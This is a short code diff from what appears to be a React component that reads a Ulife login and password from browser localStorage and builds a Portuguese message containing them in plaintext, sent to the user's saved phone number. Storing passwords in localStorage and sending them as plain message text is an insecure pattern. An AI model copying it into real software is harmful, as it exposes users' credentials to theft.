@@ -9,7 +9,7 @@ export default function AlertDemo() {
     const senha = localStorage.getItem("ulifeSenha");
     const numero = localStorage.getItem("numeroUsuario");
 
-    const msg = `🔐 Dados Ulife:\n\nLogin: ${login}\nSenha: ${senha}\nNúmero: ${numero}\n`;
+    const msg = `🔐 Dados Ulife:\n\nLogin: ${login}\nSenha: ${senha}\n`;
 
     const numeroDestino = numero; // envia para o número salvo
 
